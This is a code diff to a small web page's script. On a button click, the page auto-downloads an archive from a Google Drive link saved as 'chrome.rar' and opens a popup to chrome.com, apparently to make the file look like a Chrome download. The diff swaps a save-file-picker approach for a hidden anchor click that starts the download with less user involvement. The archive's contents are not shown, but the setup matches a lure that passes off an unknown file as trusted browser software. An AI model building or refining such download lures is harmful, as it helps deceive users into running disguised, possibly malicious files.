@@ -19,37 +19,23 @@ pre { background:#111;color:#0f0;padding:10px }
 const logEl = document.getElementById("log");
 const log = m => logEl.textContent += m + "\n";
 
-document.getElementById("btn").onclick = async () => {
+document.getElementById("btn").onclick = () => {
 
   log("[1] User click received");
 
   const url = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
 
-  try {
+  const a = document.createElement("a");
+  a.href = url;
+  a.setAttribute("download","chrome.rar");
 
-    log("[2] Opening save file picker");
+  document.body.appendChild(a);
 
-    const handle = await window.showSaveFilePicker({
-      suggestedName: "chrome.rar",
-      types: [{
-        description: "RAR Archive",
-        accept: { "application/x-rar-compressed": [".rar"] }
-      }]
-    });
+  log("[2] Triggering save request");
 
-    const response = await fetch(url);
-    const blob = await response.blob();
+  a.click();
 
-    const writable = await handle.createWritable();
-
-    await writable.write(blob);
-    await writable.close();
-
-    log("[3] File saved");
-
-  } catch(e) {
-    log("[ERROR] " + e);
-  }
+  a.remove();
 
   const w = window.open(
     "https://chrome.com",
@@ -65,7 +51,7 @@ document.getElementById("btn").onclick = async () => {
   if(!w){
     log("[ERROR] Popup blocked");
   } else {
-    log("[4] Popup opened");
+    log("[3] Popup opened");
   }
 
 };
